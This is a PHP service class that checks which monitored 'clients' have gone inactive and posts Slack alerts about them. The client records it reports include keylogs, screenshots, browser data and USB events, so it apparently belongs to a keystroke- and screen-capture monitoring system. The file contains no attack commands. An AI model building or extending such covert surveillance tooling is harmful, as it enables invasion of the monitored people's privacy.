<?php
/**
 * Status Monitor Service
 * Checks client status and triggers Slack notifications for inactive clients
 */

// Get absolute path to Backend directory
$backend_dir = dirname(dirname(dirname(__DIR__)));

require_once $backend_dir . '/config.inc.php';
require_once __DIR__ . '/DatabaseService.php';
require_once $backend_dir . '/services/SlackService.php';
require_once __DIR__ . '/../config/slack_config.php';

class StatusMonitorService {
    private $dbService;
    private $slackService;
    private $mysqli;
    
    public function __construct() {
        // Initialize database connection
        $config = new JConfig();
        $this->mysqli = new mysqli($config->dbhost, $config->dbuser, $config->dbpassword, $config->dbname);
        
        if ($this->mysqli->connect_error) {
            error_log("Database connection failed: " . $this->mysqli->connect_error);
            throw new Exception("Database connection failed");
        }
        
        // Initialize services
        $this->dbService = new DatabaseService($this->mysqli);
        $this->slackService = new SlackService();
    }
    
    /**
     * Check status and send notifications if needed
     */
    public function checkAndNotify() {
        try {
            $this->log("Starting status check...");
            
            // Get inactive clients grouped by username
            $inactive_clients = $this->dbService->getInactiveClientsGroupedByUser(SLACK_INACTIVITY_THRESHOLD_MINUTES);
            
            if (empty($inactive_clients)) {
                $this->log("No inactive clients found - no notification needed");
                return true;
            }
            
            $total_inactive = 0;
            foreach ($inactive_clients as $username => $clients) {
                $total_inactive += count($clients);
            }
            
            $this->log("Found {$total_inactive} inactive clients across " . count($inactive_clients) . " users");
            
            // Build and send Slack messages (one per user to avoid length limits)
            $message_payloads = $this->slackService->buildInactiveClientsMessage($inactive_clients);
            
            if ($message_payloads && is_array($message_payloads)) {
                $result = $this->slackService->sendMultipleMessages($message_payloads, 500); // 500ms delay
                
                if ($result['success'] === $result['total']) {
                    $this->log("All {$result['total']} Slack notifications sent successfully");
                    return true;
                } else {
                    $this->log("Only {$result['success']}/{$result['total']} Slack notifications sent successfully");
                    return false;
                }
            } else {
                $this->log("No message payloads to send");
                return true;
            }
            
        } catch (Exception $e) {
            $this->log("Error during status check: " . $e->getMessage());
            return false;
        }
    }
    
    /**
     * Get status summary for debugging
     */
    public function getStatusSummary() {
        try {
            $inactive_clients = $this->dbService->getInactiveClientsGroupedByUser(SLACK_INACTIVITY_THRESHOLD_MINUTES);
            
            $summary = [
                'check_time' => date('Y-m-d H:i:s'),
                'threshold_minutes' => SLACK_INACTIVITY_THRESHOLD_MINUTES,
                'total_users_with_inactive_clients' => count($inactive_clients),
                'total_inactive_clients' => 0,
                'users' => []
            ];
            
            foreach ($inactive_clients as $username => $clients) {
                $user_summary = [
                    'username' => $username,
                    'inactive_count' => count($clients),
                    'clients' => []
                ];
                
                foreach ($clients as $client) {
                    $user_summary['clients'][] = [
                        'name' => $client['name'] ?? $client['ip_address'],
                        'ip_address' => $client['ip_address'],
                        'status' => $client['status'],
                        'last_update' => $client['last_update'],
                        'last_screenshot' => $client['last_screenshot'],
                        'last_keylog' => $client['last_keylog'],
                        'last_browser' => $client['last_browser'],
                        'last_usb' => $client['last_usb']
                    ];
                }
                
                $summary['users'][] = $user_summary;
                $summary['total_inactive_clients'] += count($clients);
            }
            
            return $summary;
            
        } catch (Exception $e) {
            $this->log("Error getting status summary: " . $e->getMessage());
            return null;
        }
    }
    
    /**
     * Test Slack connection
     */
    public function testSlackConnection() {
        $this->log("Testing Slack connection...");
        $success = $this->slackService->testConnection();
        
        if ($success) {
            $this->log("Slack connection test successful");
        } else {
            $this->log("Slack connection test failed");
        }
        
        return $success;
    }
    
    /**
     * Log messages
     */
    private function log($message) {
        $timestamp = date('Y-m-d H:i:s');
        $log_entry = "[{$timestamp}] StatusMonitor: {$message}\n";
        
        if (SLACK_DEBUG_MODE) {
            error_log($log_entry);
        }
        
        // Write to log file
        @file_put_contents(SLACK_LOG_FILE, $log_entry, FILE_APPEND | LOCK_EX);
    }
    
    /**
     * Cleanup resources
     */
    public function __destruct() {
        if ($this->mysqli) {
            $this->mysqli->close();
        }
    }
}
?>
